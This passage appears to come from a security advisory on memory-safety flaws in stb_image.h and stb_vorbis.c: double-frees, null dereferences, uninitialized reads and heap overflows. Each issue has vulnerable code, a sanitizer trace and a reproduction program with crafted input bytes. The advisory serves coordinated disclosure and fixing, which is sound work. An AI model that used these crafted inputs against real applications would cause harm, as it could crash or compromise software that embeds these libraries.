   if ( input[3] != 0 ) {
      float f1;
      // Exponent
      f1 = (float) ldexp(1.0f, input[3] - (int)(128 + 8));
      if (req_comp <= 2)
         output[0] = (input[0] + input[1] + input[2]) * f1 / 3;
      else {
         output[0] = input[0] * f1;
         output[1] = input[1] * f1;
         output[2] = input[2] * f1;
      }

```

However the second case in [`stbi__tga_load`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L5936C10-L5936C20) gives much powerful capabilities because the attacker can control the size of the uninitialized buffer ([1] and [2]) and the uninitialized memory can be loaded into the image without transformations.

```
...
   tga_data = (unsigned char*)stbi__malloc_mad3(tga_width, tga_height, tga_comp, 0); // [1]
   if (!tga_data) return stbi__errpuc("outofmem", "Out of memory");

   // skip to the data's starting position (offset usually = 0)
   stbi__skip(s, tga_offset );

   if ( !tga_indexed && !tga_is_RLE && !tga_rgb16 ) {
      for (i=0; i < tga_height; ++i) {
         int row = tga_inverted ? tga_height -i - 1 : i;
         stbi_uc *tga_row = tga_data + row*tga_width*tga_comp;
         stbi__getn(s, tga_row, tga_width * tga_comp); // [2]
      }
...

```
#### Impact

Information disclosure.

#### Resources

To reproduce the issue in `stbi__hdr_load`:

1. Make MSAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x23,0x3f,0x52,0x47,0x42,0x45,0x0a,0x46,0x4f,0x52,
                            0x4d,0x41,0x54,0x3d,0x33,0x32,0x2d,0x62,0x69,0x74,
                            0x5f,0x72,0x6c,0x65,0x5f,0x72,0x67,0x62,0x65,0x0a,
                            0x0a,0x2d,0x59,0x20,0x39,0x2b,0x58,0x20,0x38,0x30};
    size_t size = sizeof(data);

    int x, y, channels;
    stbi_uc *img = stbi_load_from_memory(data, size, &x, &y, &channels, 4);
    stbi_image_free(img);
    return 0;
}

```

1. Set breakpoint at [`stbi__hdr_convert`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7132) and run the program. The second hit is before the usage of the uninitialized memory.

```
==118355==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0x5f15fa in stbi__hdr_convert(float*, unsigned char*, int) tests/../stb_image.h:7132:9
    #1 0x4e54be in stbi__hdr_load(stbi__context*, int*, int*, int*, int, stbi__result_info*) tests/../stb_image.h:7222:13
    #2 0x4b1a94 in stbi__loadf_main(stbi__context*, int*, int*, int*, int) tests/../stb_image.h:1464:25
    #3 0x4b1375 in stbi_loadf_from_memory tests/../stb_image.h:1480:11

```
### Issue 4: Double-free in `stbi__load_gif_main_outofmem` (`GHSL-2023-148`)

A crafted image file can trigger `stbi__load_gif_main_outofmem` attempt to double-free the `out` variable. [1]

```
static void *stbi__load_gif_main_outofmem(stbi__gif *g, stbi_uc *out, int **delays)
{
   STBI_FREE(g->out);
   STBI_FREE(g->history);
   STBI_FREE(g->background);

   if (out) STBI_FREE(out); // [1] Double-free
   if (delays && *delays) STBI_FREE(*delays);
   return stbi__errpuc("outofmem", "Out of memory");
}

```

This happens in [`stbi__load_gif_main`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6993-L6995) because when the `layers * stride` is zero [2] the behavior is implementation defined, but common that `realloc` frees the old memory and returns null pointer. Since it attempts to double-free the memory [3] a few lines below the first “free” [2], the issue can be potentially exploited only in a multi-threaded environment.

```
...
 void *tmp = (stbi_uc*) STBI_REALLOC_SIZED( out, out_size, layers * stride ); // [2]
 if (!tmp)
    return stbi__load_gif_main_outofmem(&g, out, delays); // [3]
...

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x47,0x49,0x46,0x38,0x39,0x61,0x00,0x00,0x00,0x00,0xf8,0x0a,0xdc,
                            0x04,0xfc,0x00,0x46,0x00,0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x46,0x00,0x00,0x2c,0x00,0x00};
    size_t size = sizeof(data);

    int x, y, z, channels;
    stbi_uc *img = stbi_load_gif_from_memory(data, size, NULL, &x, &y, &z, &channels, 4);
    stbi_image_free(img);
    return 0;
}

```

1. Run the program to hit the error.

```
==145841==ERROR: AddressSanitizer: attempting double-free on 0x602000000070 in thread T0:
    #0 0x49e522 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3
    #1 0x4eb732 in stbi__load_gif_main_outofmem(stbi__gif*, unsigned char*, int**) tests/../stb_image.h:6957:13
    #2 0x4df18f in stbi__load_gif_main(stbi__context*, int**, int*, int*, int*, int*, int) tests/../stb_image.h:6995:26
    #3 0x4de8bd in stbi_load_gif_from_memory tests/../stb_image.h:1448:30

```
### Issue 5: Null pointer dereference in `stbi__convert_format` (`GHSL-2023-149`)

A crafted image file can trigger null pointer access in [`stbi__convert_format`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1786) where `src` is null. It happens when [`stbi__pic_load_core`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6528-L6531) in `stbi__pic_load` fails, the `result` is set to zero [1], but the flow continues [2].

```
   if (!stbi__pic_load_core(s,x,y,comp, result)) {
      STBI_FREE(result);
      result=0; // [1]
   }
   *px = x;
   *py = y;
   if (req_comp == 0) req_comp = *comp;
   result=stbi__convert_format(result,4,req_comp,x,y); // [2]

```
#### Impact

This issue may lead to denial of service.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x53,0x80,0xf6,0x34,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x40,0x00,0x08,0x01,0x20,0xff,0x10,0x40,
                            0x74,0x72,0x74,0x65,0x69,0xab,0x4c,0x65,0x31,0x6e,
                            0x20,0x62,0x79,0x20,0x6d,0x65,0x6e,0x74,0x61,0x6c,
                            0x20,0x69,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,
                            0x49,0x43,0x54,0x00,0x50,0x49,0x43,0x57,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
                            0x08,0x01,0x20,0xff,0x10,0x6e,0x74,0x61,0x6c,0x20,
                            0x69,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x49,
                            0x43,0x54,0x00,0x50,0x54,0x20,0x10};
    size_t size = sizeof(data);

    int x, y, z, channels;
    stbi_uc *img = stbi_load_from_memory(data, size, &x, &y, &channels, 2);
    stbi_image_free(img);
    return 0;
}

```

1. Run the program to hit the error.

```
==183891==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x0000004f944d bp 0x7ffefb18fe50 sp 0x7ffefb18fa00 T0)
==183891==The signal is caused by a READ memory access.
==183891==Hint: address points to the zero page.
    #0 0x4f944d in stbi__convert_format(unsigned char*, int, int, unsigned int, unsigned int) tests/../stb_image.h:1786:52
    #1 0x4ecdbe in stbi__pic_load(stbi__context*, int*, int*, int*, int, stbi__result_info*) tests/../stb_image.h:6535:11
    #2 0x4e463b in stbi__load_main(stbi__context*, int*, int*, int*, int, stbi__result_info*, int) tests/../stb_image.h:1159:35
    #3 0x4dc48f in stbi__load_and_postprocess_8bit(stbi__context*, int*, int*, int*, int) tests/../stb_image.h:1261:19
    #4 0x4de334 in stbi_load_from_memory tests/../stb_image.h:1431:11

```
### Issue 6: Possible double-free or memory leak in `stbi__load_gif_main` (`GHSL-2023-150`)

It may look like [`stbi__load_gif_main`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6962-L7045) doesn’t give guarantees about the content of output value `*delays` upon failure. Although it sets `*delays` to zero at the beginning [1], it doesn’t do it in case the image is not recognized as GIF [2] and a call to `stbi__load_gif_main_outofmem` only [frees possibly allocated memory in `*delays` without resetting it to zero](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6957) in [3], [4], [5] and [6]. Thus it would be fair to say the caller of `stbi__load_gif_main` is responsible to free the allocated memory in `*delays` only if `stbi__load_gif_main` returns a non null value. However at the same time the function may return null value, but fail to free the memory in `*delays` if internally `stbi__convert_format` is called and fails [7].

```
static void *stbi__load_gif_main(stbi__context *s, int **delays, int *x, int *y, int *z, int *comp, int req_comp)
{
   if (stbi__gif_test(s)) {
...
      if (delays) {
         *delays = 0; // [1]
      }

      do {
         u = stbi__gif_load_next(s, &g, comp, req_comp, two_back);
         if (u == (stbi_uc *) s) u = 0;  // end of animated gif marker

         if (u) {
            *x = g.w;
            *y = g.h;
            ++layers;
            stride = g.w * g.h * 4;

            if (out) {
               void *tmp = (stbi_uc*) STBI_REALLOC_SIZED( out, out_size, layers * stride );
               if (!tmp)
                  return stbi__load_gif_main_outofmem(&g, out, delays); // [3]
               else {
                   out = (stbi_uc*) tmp;
                   out_size = layers * stride;
               }

               if (delays) {
                  int *new_delays = (int*) STBI_REALLOC_SIZED( *delays, delays_size, sizeof(int) * layers );
                  if (!new_delays)
                     return stbi__load_gif_main_outofmem(&g, out, delays); // [4]
                  *delays = new_delays;
                  delays_size = layers * sizeof(int);
               }
            } else {
               out = (stbi_uc*)stbi__malloc( layers * stride );
               if (!out)
                  return stbi__load_gif_main_outofmem(&g, out, delays); // [5]
               out_size = layers * stride;
               if (delays) {
                  *delays = (int*) stbi__malloc( layers * sizeof(int) );
                  if (!*delays)
                     return stbi__load_gif_main_outofmem(&g, out, delays); // [6]
                  delays_size = layers * sizeof(int);
               }
            }
            memcpy( out + ((layers - 1) * stride), u, stride );
            if (layers >= 2) {
               two_back = out - 2 * stride;
            }

            if (delays) {
               (*delays)[layers - 1U] = g.delay;
            }
         }
      } while (u != 0);

...

      // do the final conversion after loading everything;
      if (req_comp && req_comp != 4)
         out = stbi__convert_format(out, 4, req_comp, layers * g.w, g.h); // [7]

      *z = layers;
      return out;
   } else {
      return stbi__errpuc("not GIF", "Image was not as a gif type."); // [2]
   }
}

```

Thus the issue may lead to a memory leak if the caller chooses to free `delays` only when `stbi__load_gif_main` didn’t fail:

```
    int* delays = NULL;
    img = stbi_load_gif_from_memory(data, size, &delays, &x, &y, &z, &channels, req_comp);
    if (img)
      free(delays);
    stbi_image_free(img);

```

or to a double-free if the `delays` is always freed (since calling `free(NULL)` is safe).

```
    int* delays = NULL;
    img = stbi_load_gif_from_memory(data, size, &delays, &x, &y, &z, &channels, req_comp);
    free(delays);
    stbi_image_free(img);

```

Code search finds both usage scenarios in the wild.

#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x47,0x49,0x46,0x38,0x39,0x61,0xbd,0x21,0xfe,0x79,0xa9,0x97,0x53,
                            0x43,0x05,0xff,0xbe,0x21,0x00,0x30,0x03,0x01,0x00,0x21,0x00,0x2c,
                            0x00,0x00,0x00,0x00,0xbd,0x00,0x3f,0x71,0x07,0x00,0x05,0xff,0xbe,
                            0x01,0x00,0x00,0x00,0x21,0xf9,0x04,0x09,0x0a,0x00,0x1f,0x00,0x2c,
                            0x00,0x00,0x00,0x00,0xbd,0x00,0x71,0x00,0x00,0x05,0xff,0xe0,0x27,
                            0x8e,0x64,0x69,0x9e,0x68,0xaa,0xae,0x01,0x00,0x00,0x01,0x2c,0xcf,
                            0x74,0x6d,0xdf,0x78,0xae,0xef,0x7c,0x01,0x4f,0xc0,0xa0,0x70,0x48,
                            0x2c,0x1a,0x21,0x01,0x12,0x72,0xc9,0x6c,0x3a,0x9f,0x21,0xfe,0x74,
                            0x4a,0xad,0x5a,0x8f,0xd8,0xac,0x76,0xcb,0xed,0x7a,0xbf,0xe0,0xb0,
                            0x78};
    size_t size = sizeof(data);

    int x, y, z, channels;
    int* delays = NULL;
    stbi_uc *img = stbi_load_gif_from_memory(data, size, &delays, &x, &y, &z, &channels, 4);
    free(delays);
    stbi_image_free(img);
    return 0;
}

```

1. Run the program with ASAN with an instruction that allocator may fail (otherwise ASAN will quit early with `AddressSanitizer: requested allocation size ... exceeds maximum supported size`): `ASAN_OPTIONS=allocator_may_return_null=1 <program name>` to hit the error.

```
==253229==ERROR: AddressSanitizer: attempting double-free on 0x602000000010 in thread T0:
    #0 0x49e542 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3
    #1 0x4e4064 in main tests/repro.c:22:5

```
### Issue 7: Null pointer dereference because of an uninitialized variable (`GHSL-2023-151`)

If [`stbi__load_gif_main`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1448) in [`stbi_load_gif_from_memory`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1442-L1454) [1] fails it returns a null pointer and may keep the `z` variable uninitialized. In case the caller also sets the flip vertically flag [2], it continues and calls `stbi__vertical_flip_slices` [3] with the null pointer `result` value and the uninitialized `z` value.

```
STBIDEF stbi_uc *stbi_load_gif_from_memory(stbi_uc const *buffer, int len, int **delays, int *x, int *y, int *z, int *comp, int req_comp)
{
   unsigned char *result;
   stbi__context s;
   stbi__start_mem(&s,buffer,len);

   result = (unsigned char*) stbi__load_gif_main(&s, delays, x, y, z, comp, req_comp); // [1]
   if (stbi__vertically_flip_on_load) { // [2]
      stbi__vertical_flip_slices( result, *x, *y, *z, *comp ); // [3]
   }

   return result;
}

```

It depends on the value of `z` [4] if the program enters the loop and attempts to dereference the null pointer value in `stbi__vertical_flip` [5].

```
static void stbi__vertical_flip_slices(void *image, int w, int h, int z, int bytes_per_pixel)
{
   int slice;
   int slice_size = w * h * bytes_per_pixel;

   stbi_uc *bytes = (stbi_uc *)image;
   for (slice = 0; slice < z; ++slice) { // [4]
      stbi__vertical_flip(bytes, w, h, bytes_per_pixel); // [5]
      bytes += slice_size;
   }
}

```
#### Impact

This issue may lead to denial of service.

#### Resources

To reproduce the issue in `stbi__vertical_flip_slices`:

1. Make MSAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x47,0x49,0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x35,0xff};
    size_t size = sizeof(data);

    stbi_set_flip_vertically_on_load(1);
    int x, y, z, channels;
    stbi_uc *img = stbi_load_gif_from_memory(data, size, NULL, &x, &y, &z, &channels, 4);
    stbi_image_free(img);
    return 0;
}

```

1. Set breakpoint at line 1251 in [`stbi__vertical_flip_slices`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1251) and run the program to hit the usage of the uninitialized memory.

```
==292219==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0x4b0ad6 in stbi__vertical_flip_slices(void*, int, int, int, int) tests/../stb_image.h:1251:4
    #1 0x4ad19e in stbi_load_gif_from_memory tests/../stb_image.h:1450:7

```
### Issue 8: `0` byte write heap buffer overflow in `start_decoder` (`GHSL-2023-165`)

A crafted file may trigger out of bounds write in [`f->vendor[len] = (char)'\0';`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3658) [1]. The root cause is that if [`len` read in `start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3652-L3658) [2] is `-1` and `len + 1` becomes `0` when passed to `setup_malloc` in [3].

```
   len = get32_packet(f); // [2]
   f->vendor = (char*)setup_malloc(f, sizeof(char) * (len+1)); // [3]
   if (f->vendor == NULL)                           return error(f, VORBIS_outofmem);
   for(i=0; i < len; ++i) {
      f->vendor[i] = get8_packet(f);
   }
   f->vendor[len] = (char)'\0'; // [1]

```

The [`setup_malloc`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L950-L960) behaves differently when `f->alloc.alloc_buffer` is pre-allocated. Instead of returning `NULL` as in `malloc` case [4] it shifts the pre-allocated buffer by zero and returns the currently available memory block.

```
static void *setup_malloc(vorb *f, int sz)
{
   sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs.
   f->setup_memory_required += sz;
   if (f->alloc.alloc_buffer) {
      void *p = (char *) f->alloc.alloc_buffer + f->setup_offset; // [5]
      if (f->setup_offset + sz > f->temp_offset) return NULL;
      f->setup_offset += sz;
      return p;
   }
   return sz ? malloc(sz) : NULL; // [4]
}

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0xac,0xf4,0x30,
                            0x19,0x50,0x13,0x00,0x68,0x00,0x00,0x00,0x21,
                            0x00,0x40,0x00,0x00,0x00,0x7e,0x84,0x04,0x01,
                            0x1e,0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,
                            0x00,0x00,0x00,0x05,0x00,0x45,0xc5,0x87,0x03,
                            0x00,0x04,0x00,0x02,0x00,0x08,0x00,0x00,0x01,
                            0x00,0x2e,0xa9,0xcb,0x4f,0x67,0x67,0x53,0x00,
                            0x28,0x00,0x00,0xf7,0xff,0xff,0x7f,0x68,0x00,
                            0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x76,0x6f,
                            0x72,0x73,0x00,0x00,0x03,0x76,0x6f,0x72,0x62,
                            0x69,0x73,0xff,0xff,0xff,0xff};
    size_t size = sizeof(data);

    stb_vorbis_alloc alloc;
    int alloc_buffer_length = 600 * 1024;
    alloc.alloc_buffer = (char*)malloc(alloc_buffer_length);
    alloc.alloc_buffer_length_in_bytes = alloc_buffer_length;
    int err;
    stb_vorbis* out = stb_vorbis_open_memory(data, size, &err, &alloc);
    stb_vorbis_close(out);
    free(alloc.alloc_buffer);
    return 0;
}

```

1. Run the program to hit the error.

```
==93713==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f37941697ff at pc 0x0000004e41ed bp 0x7ffe67641670 sp 0x7ffe67641668
WRITE of size 1 at 0x7f37941697ff thread T0
    #0 0x4e41ec in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3658:19
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8

```
### Issue 9: Multi-byte write heap buffer overflow in `start_decoder` (`GHSL-2023-166`)

A crafted file may trigger out of bounds write in [`f->vendor[i] = get8_packet(f);`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3656). The root cause is an integer overflow in [`setup_malloc`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L950-L960). A sufficiently large `sz` overflows `sz+7` in [1] and the negative value passes the maximum available memory buffer check in [2].

```
static void *setup_malloc(vorb *f, int sz)
{
   sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs. // [1] Int overflow
   f->setup_memory_required += sz;
   if (f->alloc.alloc_buffer) {
      void *p = (char *) f->alloc.alloc_buffer + f->setup_offset;
      if (f->setup_offset + sz > f->temp_offset) return NULL; // [2] Negative int passes the check
      f->setup_offset += sz;
      return p;
   }
   return sz ? malloc(sz) : NULL;
}

```

Similar overflow exists in [`setup_temp_malloc`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L969-L978) at [3]

```
static void *setup_temp_malloc(vorb *f, int sz)
{
   sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs. // [3]
   if (f->alloc.alloc_buffer) {
      if (f->temp_offset - sz < f->setup_offset) return NULL;
      f->temp_offset -= sz;
      return (char *) f->alloc.alloc_buffer + f->temp_offset;
   }
   return malloc(sz);
}

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0xff,0xb8,0x03,
                            0x00,0xff,0x20,0xff,0x00,0x21,0x68,0x00,0x00,
                            0x00,0x00,0x00,0x00,0xa0,0x6a,0xab,0x75,0x01,
                            0x1e,0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,
                            0x00,0x00,0x00,0x01,0x31,0xef,0xf9,0xfe,0x00,
                            0x00,0x09,0x00,0x00,0x71,0x02,0x10,0x00,0x08,
                            0x00,0x9f,0xb8,0x01,0x4f,0x67,0x67,0x53,0x00,
                            0x00,0x1c,0x00,0x80,0xff,0x01,0x40,0x21,0x68,
                            0x00,0x00,0x01,0x00,0x00,0x00,0xfe,0xff,0xff,
                            0x7f,0x00,0x00,0x00,0x03,0x76,0x6f,0x72,0x62,
                            0x69,0x73,0xfe,0xff,0xff,0x7f};
    size_t size = sizeof(data);

    stb_vorbis_alloc alloc;
    int alloc_buffer_length = 600 * 1024;
    alloc.alloc_buffer = (char*)malloc(alloc_buffer_length);
    alloc.alloc_buffer_length_in_bytes = alloc_buffer_length;
    int err;
    stb_vorbis* out = stb_vorbis_open_memory(data, size, &err, &alloc);
    stb_vorbis_close(out);
    free(alloc.alloc_buffer);
    return 0;
}

```

1. Run the program to hit the error.

```
==95610==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f0f5eaff800 at pc 0x0000004e4133 bp 0x7fff88645e30 sp 0x7fff88645e28
WRITE of size 1 at 0x7f0f5eaff800 thread T0
    #0 0x4e4132 in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3656:20
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8

```
### Issue 10: Heap buffer out of bounds write in `start_decoder` (`GHSL-2023-167`)

A crafted file may trigger out of bounds write in [`f->vendor[len] = (char)'\0';`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3658) [1]. The root cause is that if [`len` read in `start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3652-L3658) [2] is a negative number and [`setup_malloc`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L950-L961) [3] successfully allocates memory in that case [4], but memory write is done with a negative index `len` [1].

```
   len = get32_packet(f); // [2]
   f->vendor = (char*)setup_malloc(f, sizeof(char) * (len+1)); // [3]
   if (f->vendor == NULL)                           return error(f, VORBIS_outofmem);
   for(i=0; i < len; ++i) {
      f->vendor[i] = get8_packet(f);
   }
   f->vendor[len] = (char)'\0'; // [1]

...

static void *setup_malloc(vorb *f, int sz)
{
   sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs.
   f->setup_memory_required += sz;
   if (f->alloc.alloc_buffer) {
      void *p = (char *) f->alloc.alloc_buffer + f->setup_offset; // [4]
      if (f->setup_offset + sz > f->temp_offset) return NULL;
      f->setup_offset += sz;
      return p;
   }
   return sz ? malloc(sz) : NULL;
}

```

Same vulnerability exists in [`setup_temp_malloc`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L969-L978) at [5]

```
static void *setup_temp_malloc(vorb *f, int sz)
{
   sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs.
   if (f->alloc.alloc_buffer) {
      if (f->temp_offset - sz < f->setup_offset) return NULL; // [5]
      f->temp_offset -= sz;
      return (char *) f->alloc.alloc_buffer + f->temp_offset;
   }
   return malloc(sz);
}

```

Similarly if `len` is `INT_MAX` the integer overflow `len+1` happens in [`f->vendor = (char*)setup_malloc(f, sizeof(char) * (len+1));`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3653) [1] and [`f->comment_list[i] = (char*)setup_malloc(f, sizeof(char) * (len+1));`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3670C7-L3670C75) [6]. This case however allows writing multiple times past the end of the internal `f->alloc.alloc_buffer` buffer.

```
   for(i=0; i < f->comment_list_length; ++i) {
      len = get32_packet(f);
      f->comment_list[i] = (char*)setup_malloc(f, sizeof(char) * (len+1)); // [6]
      if (f->comment_list[i] == NULL)               return error(f, VORBIS_outofmem);

      for(j=0; j < len; ++j) {
         f->comment_list[i][j] = get8_packet(f);
      }
      f->comment_list[i][len] = (char)'\0';
   }

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0xac,0xf4,0x30,
                            0x19,0x50,0x13,0x00,0x68,0x00,0x00,0x00,0x21,
                            0x00,0x40,0x00,0x00,0x00,0x7e,0x84,0x04,0x01,
                            0x1e,0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,
                            0x00,0x00,0x00,0x05,0x00,0x45,0xc5,0x87,0x03,
                            0x00,0x04,0x00,0x02,0x00,0x08,0x00,0x00,0x01,
                            0x00,0x2e,0xa9,0xcb,0x4f,0x67,0x67,0x53,0x00,
                            0x28,0x00,0x00,0xf7,0xff,0xff,0x7f,0x68,0x00,
                            0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x76,0x6f,
                            0x72,0x73,0x00,0x00,0x03,0x76,0x6f,0x72,0x62,
                            0x69,0x73,0xff,0xff,0xff,0xee};
    size_t size = sizeof(data);

    stb_vorbis_alloc alloc;
    int alloc_buffer_length = 600 * 1024;
    alloc.alloc_buffer = (char*)malloc(alloc_buffer_length);
    alloc.alloc_buffer_length_in_bytes = alloc_buffer_length;
    int err;
    stb_vorbis* out = stb_vorbis_open_memory(data, size, &err, &alloc);
    stb_vorbis_close(out);
    free(alloc.alloc_buffer);
    return 0;
}

```

1. Run the program to hit the error.

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==302322==ERROR: AddressSanitizer: SEGV on unknown address 0x7f70bd3697ff (pc 0x0000004e41f4 bp 0x7ffc029b3070 sp 0x7ffc029b0be0 T0)
==302322==The signal is caused by a WRITE memory access.
    #0 0x4e41f4 in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3658:19
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8
    #2 0x4fd8e9 in main tests/stb_vorbis_fuzzer.c:24:23

```
### Issue 11: Off-by-one heap buffer write in `start_decoder` (`GHSL-2023-168`)

A crafted file may trigger out of buffer write in [`start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4105-L4111) at [1] and [2]

```
      for (j=0; j < m->submaps; ++j) {
         get_bits(f,8); // discard
         m->submap_floor[j] = get_bits(f,8); // [1] Off by one write
         m->submap_residue[j] = get_bits(f,8); // [2] Off by one write
         if (m->submap_floor[j] >= f->floor_count)      return error(f, VORBIS_invalid_setup);
         if (m->submap_residue[j] >= f->residue_count)  return error(f, VORBIS_invalid_setup);
      }

```

because at maximum `m->submaps` [can be 16](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4074-L4079) [3]

```
      if (get_bits(f,1))
         m->submaps = get_bits(f,4)+1; // [3]
      else
         m->submaps = 1;
      if (m->submaps > max_submaps)
         max_submaps = m->submaps;

```

but [`submap_floor` and `submap_residue` are declared](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L753-L760) as arrays of 15 elements at [4] and [5]

```
typedef struct
{
   uint16 coupling_steps;
   MappingChannel *chan;
   uint8  submaps;
   uint8  submap_floor[15]; // varies // [4]
   uint8  submap_residue[15]; // varies // [5]
} Mapping;

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make UBSAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0x01,0x5a,0x81,
                            0x15,0x9c,0x00,0x00,0xbe,0x21,0x68,0x00,0x00,
                            0x00,0x00,0x00,0x00,0xa2,0x64,0x89,0x6f,0x01,
                            0x1e,0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,
                            0x00,0x00,0x00,0x0e,0x31,0x1e,0x01,0x76,0x6f,
                            0x72,0xe3,0x12,0x02,0x62,0x69,0x20,0xd7,0x73,
                            0x06,0xd0,0x97,0x75,0x4f,0x67,0x67,0x53,0x00,
                            0x9c,0x00,0xfc,0x00,0x4b,0x02,0x2d,0x24,0x00,
                            0x21,0x68,0x00,0x00,0x01,0x00,0x00,0x00,0xff,
                            0xff,0xff,0x05,0x05,0x16,0x3e,0x16,0x01,0x01,
                            0x03,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x27,0x04,0x00,
                            0x7b,0x0b,0x12,0x0d,0x05,0x76,0x6f,0x72,0x62,
